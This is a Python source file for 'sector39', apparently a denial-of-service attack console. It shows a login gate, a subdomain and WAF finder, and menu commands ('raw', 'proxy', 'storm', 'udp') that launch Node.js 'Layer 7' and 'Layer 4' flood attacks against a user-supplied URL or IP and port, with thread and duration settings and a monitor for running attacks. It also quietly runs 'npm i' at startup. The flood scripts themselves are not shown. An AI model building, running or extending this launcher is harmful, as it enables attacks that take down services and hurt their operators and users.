import configparser
from getpass import getpass
import subprocess
import sys
import os
import time
from lib import warna
from lib import NetworkSpeedTest
from lib import Osas
from lib import Ambatron
from lib import LookupIp
from tools import FindSubdomain

ongoing = []

def Ngetik(teks, delay=0.012):
    for i in teks:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def FindSubdo():
    plus = f"[{warna.g}+{warna.reset}]"
    target = input(f"{plus} Input target eg: google.com\n_# ")
    file = input(f"{plus} Input file that contain subdo (enter for default scan)\n_# ")
    if not file:
        file = "src/subdo.txt"
    print(f"{plus} Scanning . . .")
    finder = FindSubdomain(target=target, file=file)
    finder.SubdoToIp()
    finder.WafCheck()
    finder.FetchResult()



def Cls():
    if os.name == "nt":
        os.system('cls')
    else:
        os.system('clear')

def Security():
    sector39Conf = '.auth/sector39.conf'
    print(f"[{warna.g}+{warna.reset}] >> an authentication required <<")
    
    config = configparser.ConfigParser()
    config.read(sector39Conf)
    usrname = config.get('authentication', 'username')
    paswd = config.get('authentication', 'password')

    max = 3 
    attempts = 0 

    while attempts < max:
        input_usrname = input("Username_# ")
        input_paswd = getpass("Password_# ")

        if input_usrname == usrname and input_paswd == paswd:
            print("Access granted!")
            return True 
        else:
            attempts += 1
            attempts = max - attempts
            print(f"{attempts} attempt(s) left.")
        
        if attempts == max:
            print("Maximum attempts reached. Exiting...")
            sys.exit(1)

    return False

def monitor():
    if not ongoing:
        print("No running attack")
        return

    print("\n==================== LIST OF RUNNING ATTACK ==================== ")
    for i, proc in enumerate(ongoing):
        status = proc.poll()  
        if status is None:
            print(f"[{i + 1}] ID: {proc.pid} (Running)")
        else:
            print(f"[{i + 1}] ID: {proc.pid} (finished)")

def Ingfonya():
    teks = f"""============================ {warna.b}INFO{warna.reset} ============================
nksp          Network speed test
method        List of method
subdo         find subdomain based on list of subdo"""
    return print(teks)

def Interface():
    global ongoing

    jawa = f"Landed successfully on '{warna.g}sector39{warna.reset}' "
    sector39 = r"""
# ·································································
# :______________________________________________  ______________ :
# :__  ___/__  ____/_  ____/__  __/_  __ \__  __ \ __|__  /_  __ \:
# :_____ \__  __/  _  /    __  /  _  / / /_  /_/ / ___/_ <_  /_/ /:
# :____/ /_  /___  / /___  _  /   / /_/ /_  _, _/  ____/ /_\__, / :
# :/____/ /_____/  \____/  /_/    \____/ /_/ |_|   /____/ /____/  :
# ·································································"""
    Fufu = Ambatron()
    Fafa = LookupIp(Fufu)
    info = f"""
============================ {warna.b}SECTOR 39{warna.reset} ============================
version 0.1.1_pre_release developer t.me/adjidev
type '{warna.g}help{warna.reset}' if you don't know anything about this
Ctrl + C to exit from this interface
Your network information
- {warna.y}IP{warna.reset}       : {Fufu}
- {warna.y}COUNTRY{warna.reset}  : {Fafa.type(['country'])}
- {warna.y}REGION{warna.reset}   : {Fafa.type(['region'])}
- {warna.y}POSTAL{warna.reset}   : {Fafa.type(['postal'])}
- {warna.y}CITY{warna.reset}     : {Fafa.type(['city'])}\n"""
    Cls()
    Ngetik(jawa)
    print(warna.c + sector39 + warna.reset)
    print(info)

    while True:
        try:
            landed = input(f"{warna.r}console{warna.reset}@sector39 _# ")
            if landed in ['networkspeed', 'speedtest', 'nksp']:
                NetworkSpeedTest()
            elif landed in ['subdo', 'subdofinder', 'subdomain']:
                FindSubdo()
            elif landed in ['help', 'menu', 'sector39']:
                Ingfonya()
            elif landed in ['method', 'methods']:
                print(f">> {warna.g}Method list{warna.reset} <<")
                print("raw")
                print("proxy")
                print("storm")
            elif landed in ['raw', 'proxy', 'storm']:
                try:
                    target = input("Url target_# ")
                    duration = int(input("Duration_# "))
                    thrad = int(input("Input max threads_# "))
                    process = subprocess.Popen(
                        ['node', 'sector/raw.js', target, str(duration), landed, str(thrad)],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE
                    )
                    ongoing.append(process)
                    print(f"Layer 7 attack started! ID: {process.pid}")
                except Exception as er:
                    print(f"{er}")
            elif landed in ['udp']:
                try:
                    target = input("Ip target_# ")
                    port = int(input("Port_# "))
                    duration = int(input("Duration_# "))
                    process = subprocess.Popen(
                        ['node', 'sector/udp.js', target, str(port), str(duration)],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE
                    )
                    ongoing.append(process)
                    print(f"Layer 4 attack started ID: {process.pid}")
                except Exception as er:
                    print(f"{er}")
            elif landed in ['ongoing', 'monitor']:
                monitor()
            else:
                pass
        except KeyboardInterrupt:
            print("\n[   EXIT   ]")
            for proc in ongoing:
                if proc.poll() is None:
                    proc.terminate()
            sys.exit(1)

if __name__ == "__main__":
    print("Initialize . . .")
    subprocess.Popen(
        ['npm', 'i'],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    if Security():
        Interface()
    else:
        print("\nExit")
        sys.exit(1)